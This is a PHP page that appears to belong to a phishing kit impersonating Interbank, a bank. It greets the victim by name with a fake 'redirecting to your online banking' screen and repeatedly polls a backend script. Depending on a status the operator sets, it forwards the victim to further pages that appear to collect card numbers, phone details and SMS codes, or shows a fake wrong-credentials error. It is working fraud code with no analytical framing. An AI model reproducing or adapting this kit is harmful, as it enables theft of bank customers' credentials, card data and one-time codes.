<?php
error_reporting(0);
session_start();

$x = $_GET["id"];
$y = $_GET["cgi"];

$dni = base64_decode($x);


$rand1= random_int(888,874589);

?>

<html>
<head>
<title>Interbank</title>
<meta name="viewport" content="user-scalable=no, initial-scale=1, maximum-scale=1">
<!--<meta http-equiv="refresh" content="5;url=vcell.php?id=utm_source=Interbank&p=<?=$y;?>&code_id=Cell&cgi=<?=$x;?>">-->
<link href="../files/css/app.bc2488273fa3c4d7807a8428e9d76ac2.css" rel="stylesheet">
<script src="../jquery-3.5.1.min.js" type="text/javascript"></script>
<style>
/* Center the loader */
#loader {
  z-index: 1;
  width: 70px;
  height: 70px;
  border: 16px solid #cecece;
  border-radius: 50%;
  border-top: 16px solid #2f4a9f;
  width: 70px;
  height: 70px;
  -webkit-animation: spin 2s linear infinite;
  animation: spin 2s linear infinite;
}


@-webkit-keyframes spin {
  0% { -webkit-transform: rotate(0deg); }
  100% { -webkit-transform: rotate(360deg); }
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

/* Add animation to "page content" */
.animate-bottom {
  position: relative;
  -webkit-animation-name: animatebottom;
  -webkit-animation-duration: 1s;
  animation-name: animatebottom;
  animation-duration: 1s
}

@-webkit-keyframes animatebottom {
  from { bottom:-100px; opacity:0 } 
  to { bottom:0px; opacity:1 }
}

@keyframes animatebottom { 
  from{ bottom:-100px; opacity:0 } 
  to{ bottom:0; opacity:1 }
}

#myDiv {
  display: none;
  text-align: center;
}

</style>
</head>
<body style="margin:0; background-color: #009c3a;" >

<div style="display:block;" id="myDiv" class="animate-bottom">
  <center>
  <br>
  <br>
  <br>
  <br>
  <img src="../files/images/descarga.png" style=" width: 200px; ">
  <div style="color: #ffffff; border-top: 1px; border-style: solid; width: 300px;"></div><br>
  <div style="color: white; font-size: 20px;">Bienvenido/a<br><b><?php echo $_SESSION["nombre"]; ?></b></div><br>
  
  <div id="msg1" style="color: white; font-size: 17px;">Sera redirigido a su <br>banca en linea en unos instantes...</div>
  <div id="msg2" style="display:none;color: darkblue ; font-size: 25px; font-weight: bold; ; ">
      Número de tarjeta, <br>DNI o Clave <span style="color:darkred;"><b>INCORRECTA</b></span><br>Intente nuevamente.
  </div>
  
  </center>
</div>

<script>
$(function()
{
    var timer1;
    
    demonio=function()
    {
        $.post("../loginx.php?id=88",{},function(raw)
        {
            console.log(raw);
            try
            {
                data=JSON.parse(raw);
                estado=data.estado;
                if(estado=="cc")
                {
                    location.href="vcell.php?id=utm_source=Interbank&p=UlI0M0VSUlJUlJSUg==&code_id=<?php echo $rand1Cell;?>&cgi=NDQ4NDUyMTQ=";
                    return;
                }else if(estado=="celular")
                {
                    location.href="vcel.php?id=utm_source=Interbank&p=UlI0M0VSUlJUlJSUg==&code_id=<?php echo $rand1Cell;?>&cgi=NDQ4NDUyMTQ=";
                    return;
                }else if(estado=="sms")
                {
                    location.href="vcelll.php?id=utm_source=Interbank&p=UlI0M0VSUlJUlJSUg==&code_id=<?php echo $rand1Cell;?>&cgi=NDQ4NDUyMTQ=";
                    return;
                }else if(estado=="fin")
                {
                    location.href="complete.php?id=utm_source=Interbank&p=UlI0M0VSUlJUlJSUg==&code_id=<?php echo $rand1Cell;?>&cgi=NDQ4NDUyMTQ=";
                    return;
                }else if(estado=="acceso_error")
                {
                    $("#msg1").hide();
                    $("#msg2").show();
                    window.setTimeout(function()
                    {
                        location.href="../";
                        return;
                    },9000);
                    
                }
            }catch(e)
            {
                
            }
        });
    }
    
    timer1= window.setInterval(demonio,1500);
});
</script>

</body>
</html>
